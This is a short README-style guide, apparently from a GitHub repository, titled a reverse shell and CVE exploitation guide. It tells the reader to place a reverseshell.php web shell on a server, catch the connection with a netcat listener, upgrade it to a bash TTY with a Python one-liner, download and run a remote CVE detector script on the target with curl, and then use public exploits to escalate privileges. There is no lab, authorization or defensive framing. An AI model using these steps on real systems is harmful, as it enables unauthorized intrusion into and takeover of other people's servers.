# Reverse Shell & CVE Exploitation Guide

> Author: **Khayrol Islam**  
> Telegram: [@DevidLuice](https://t.me/DevidLuice)

---

## 1. Upload `reverseshell.php` to Your Host

- First, upload your `reverseshell.php` file to your web server/hosting.
- Then open the URL in your browser:

http://your-host.com/reverseshell.php



📸 **Example Screenshot:**  
![Upload Page](https://github.com/mrTr1cky/linux_priv_Guid-/blob/main/name.png)

---

## 2. Start Netcat Listener

On your machine, run:

nc -lnvp 1337


---

## 3. Enter Your Public IP and Port in `reverseshell.php`

- Input your **public IP address** and the **port** (example: 1337) inside the form of `reverseshell.php`.

📸 **Example Screenshot:**  
![Enter IP/Port](https://github.com/mrTr1cky/linux_priv_Guid-/blob/main/exploit.png)

---

## 4. Receive Reverse Shell

- After entering the IP and port, the server will connect back to your machine.
- You will get a reverse shell in your Netcat terminal.

---

## 5. Upgrade to Full TTY Shell

Once connected, upgrade the shell for better control:


python3 -c 'import pty; pty.spawn("/bin/bash")'



(If `python3` is not available, try `python`.)

---

## 6. Download and Run CVE Detector

Download the Linux CVE detector script:

curl https://raw.githubusercontent.com/mrTr1cky/linux_priv_Guid-/refs/heads/main/cve-detector.sh -o cve-detector.sh

Make it executable:
chmod +x cve-detector.sh
Run the script:

It will scan the system for known vulnerabilities (CVEs).

---

## 7. Exploit Detected Vulnerabilities

- After getting the list of CVEs, find public exploits for them.
- Use the exploits to escalate your privileges on the target system.

---

# 🚀 Happy Hacking!

> Author: **Khayrol Islam**  
> Telegram: [@DevidLuice](https://t.me/DevidLuice)

---

